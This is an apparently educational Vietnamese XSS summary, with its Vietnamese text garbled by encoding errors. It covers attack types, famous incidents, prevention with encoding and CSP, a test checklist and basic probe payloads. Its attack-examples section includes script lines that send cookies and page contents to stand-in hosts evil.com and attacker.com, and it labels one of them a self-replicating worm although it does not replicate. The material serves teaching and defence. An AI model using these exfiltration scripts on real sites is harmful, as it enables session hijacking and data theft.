# Cross-Site Scripting (XSS) â€” TÃ³m táº¯t má»Ÿ rá»™ng (Full Version)

## ğŸ“Œ 1. Giá»›i thiá»‡u  
Cross-Site Scripting (XSS) lÃ  lá»— há»•ng web xuáº¥t hiá»‡n khi á»©ng dá»¥ng **khÃ´ng lá»c hoáº·c encode dá»¯ liá»‡u Ä‘áº§u vÃ o**, cho phÃ©p attacker chÃ¨n vÃ  thá»±c thi JavaScript trÃªn trÃ¬nh duyá»‡t cá»§a náº¡n nhÃ¢n.

- áº¢nh hÆ°á»Ÿng trá»±c tiáº¿p: NgÆ°á»i dÃ¹ng (client-side)
- áº¢nh hÆ°á»Ÿng giÃ¡n tiáº¿p: Trung bÃ¬nh (low impact + high probability)
- Nguy hiá»ƒm vÃ¬:  
  - Dá»… gáº·p  
  - Dá»… khai thÃ¡c  
  - áº¢nh hÆ°á»Ÿng lá»›n Ä‘áº¿n privacy & session

---

## ğŸ“Œ 2. CÃ¡ch XSS hoáº¡t Ä‘á»™ng  
```
User Input â†’ Backend khÃ´ng sanitize â†’ TrÃ¬nh duyá»‡t render â†’ Script Ä‘Æ°á»£c thá»±c thi
```

CÃ¡c Ä‘iá»ƒm dá»… bá»‹ XSS:
- Comment
- Search bar
- Form Ä‘Äƒng kÃ½ / Ä‘Äƒng nháº­p
- Query params (Reflected)
- DOM manipulation (innerHTML)

---

## ğŸ“Œ 3. Flowchart: CÃ¡ch xáº£y ra XSS

```mermaid
flowchart TD
    A[User nháº­p dá»¯ liá»‡u] --> B{Backend kiá»ƒm tra dá»¯ liá»‡u?}
    B -- KhÃ´ng Ä‘Ãºng cÃ¡ch --> C[Payload Ä‘á»™c háº¡i lÆ°u hoáº·c pháº£n há»“i]
    C --> D[TrÃ¬nh duyá»‡t ngÆ°á»i dÃ¹ng khÃ¡c táº£i trang]
    D --> E[JavaScript Ä‘á»™c háº¡i thá»±c thi]
    E --> F[Session hijack / Phishing / Worm / Keylogger]

    B -- CÃ³ kiá»ƒm tra Ä‘Ãºng --> G[KhÃ´ng xáº£y ra XSS]
```

---

## ğŸ“Œ 4. CÃ¡c dáº¡ng táº¥n cÃ´ng XSS thá»±c táº¿
### ğŸ”¥ Session Hijacking  
```
<script>
document.location='http://evil.com/steal?c='+document.cookie;
</script>
```

### ğŸ£ Phishing (giáº£ popup Ä‘Äƒng nháº­p)
```
<script>
alert('PhiÃªn Ä‘Äƒng nháº­p háº¿t háº¡n, hÃ£y Ä‘Äƒng nháº­p láº¡i!');
</script>
```

### ğŸ”„ Selfâ€‘replicating Worm (Samy Worm style)
```
<script>
var s = document.createElement('img');
s.src='http://attacker.com/log?u='+document.body.innerHTML;
</script>
```

---

## ğŸ“Œ 5. CÃ¡c vá»¥ XSS ná»•i tiáº¿ng trong thá»±c táº¿  
| NÄƒm | Sá»± kiá»‡n | MÃ´ táº£ |
|-----|---------|-------|
| **2005** | Samy Worm | LÃ¢y 1M user MySpace trong 24h |
| **2014** | TweetDeck XSS | Tweet tá»± retweet 38.000 láº§n trong 2 phÃºt |
| **2019** | Google Search XSS | Lá»—i XSS trong XML parser |
| **2010** | Apache.org XSS | ÄÃ¡nh cáº¯p password ngÆ°á»i dÃ¹ng |

---

## ğŸ“Œ 6. Ba loáº¡i XSS chÃ­nh  
| Loáº¡i | Äáº·c Ä‘iá»ƒm | VÃ­ dá»¥ |
|------|----------|--------|
| **Stored XSS** | LÆ°u trong DB â†’ ai xem cÅ©ng dÃ­nh | Comment/posts |
| **Reflected XSS** | KhÃ´ng lÆ°u, náº±m trong response | Search parameter |
| **DOM-Based XSS** | Xá»­ lÃ½ **thuáº§n client** | location.hash, innerHTML |

---

## ğŸ“Œ 7. Táº¥n cÃ´ng XSS cÃ³ thá»ƒ gÃ¢y ra  
- ÄÃ¡nh cáº¯p session / cookie  
- Máº¡o danh ngÆ°á»i dÃ¹ng  
- Thay Ä‘á»•i máº­t kháº©u  
- Phishing  
- Defacing website  
- Viáº¿t worm tá»± nhÃ¢n báº£n  
- ÄÃ o coin trÃªn trÃ¬nh duyá»‡t  
- TÆ°Æ¡ng tÃ¡c API trÃ¡i phÃ©p  
- Khai thÃ¡c lá»— há»•ng trÃ¬nh duyá»‡t Ä‘á»ƒ RCE

---

## ğŸ“Œ 8. PhÃ²ng chá»‘ng XSS  
### ğŸ§¹ 1. Input Validation  
- Loáº¡i bá» kÃ½ tá»± nguy hiá»ƒm `< > " ' / &`

### ğŸ” 2. Output Encoding  
- Encode HTML, JS, URL

### ğŸ§© 3. Sá»­ dá»¥ng Content Security Policy (CSP)  
VÃ­ dá»¥: cháº·n inline script
```
Content-Security-Policy: script-src 'self';
```

### ğŸ§± 4. KhÃ´ng bao giá» trust dá»¯ liá»‡u tá»« client  

### ğŸ“¦ 5. Sá»­ dá»¥ng framework an toÃ n  
- React  
- Angular  
- Django  
- Laravel  
(Ä‘á»u auto sanitize)

---

## ğŸ“Œ 9. Checklist kiá»ƒm tra XSS nhanh  
- [ ] Kiá»ƒm tra input Ä‘á»ƒ tÃ¬m kÃ½ tá»± `<script>`  
- [ ] Thá»­ payload vÃ o search bar  
- [ ] Kiá»ƒm tra DOM (innerHTML, document.write)  
- [ ] Kiá»ƒm tra param URL  
- [ ] Kiá»ƒm tra cÃ¡c API tráº£ vá» HTML  
- [ ] Kiá»ƒm thá»­ Stored XSS tá»« comment/profile  

---

## ğŸ“Œ 10. Payload XSS cÆ¡ báº£n  
| Loáº¡i | Payload |
|------|---------|
| Popâ€‘up test | `<script>alert(1)</script>` |
| Bypass HTML tag | `<img src=x onerror=alert(1)>` |
| Inline JS | `" onmouseover="alert(1)` |
| DOM XSS | `#"><img src=x onerror=alert(1)>` |

---

## ğŸ“Œ 11. Káº¿t luáº­n  
XSS váº«n lÃ  má»™t trong nhá»¯ng lá»— há»•ng phá»• biáº¿n nháº¥t, dá»… khai thÃ¡c nhÆ°ng cá»±c ká»³ nguy hiá»ƒm.  
Viá»‡c phÃ²ng chá»‘ng pháº£i káº¿t há»£p:  
âœ” Input filtering  
âœ” Output encoding  
âœ” CSP  
âœ” Developer training  

---


